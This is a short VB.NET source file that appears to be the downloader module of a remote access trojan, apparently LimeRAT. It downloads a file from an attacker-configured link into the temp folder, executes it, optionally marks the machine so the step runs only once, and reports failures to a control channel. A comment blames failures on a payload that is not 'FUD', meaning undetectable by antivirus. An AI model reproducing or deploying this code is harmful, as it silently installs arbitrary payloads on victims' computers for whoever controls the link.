Namespace Lime

    Public Class C_Downloader
        Public Shared Sub Downloader()
            Dim WC As New Net.WebClient
            Dim file As String = IO.Path.GetTempFileName + IO.Path.GetFileName(C_Settings.DWN_LINK)
            Try
                If C_Settings.DWN_LINK <> "" Then

                    If C_Settings.DWN_CHK = True Then
                        If GTV("DWN") <> "True" Then
                            WC.DownloadFile(C_Settings.DWN_LINK, file)
                            Diagnostics.Process.Start(file)
                            STV("DWN", "True")
                        End If
                    Else
                        WC.DownloadFile(C_Settings.DWN_LINK, file)
                        Diagnostics.Process.Start(file)
                    End If
                End If
            Catch ex As Exception
                C_Main.C.Send("MSG" + C_Main.SPL + "DWN Error! " + ex.Message) 'Maybe file is not FUD or link problem
            End Try
        End Sub
    End Class

End Namespace
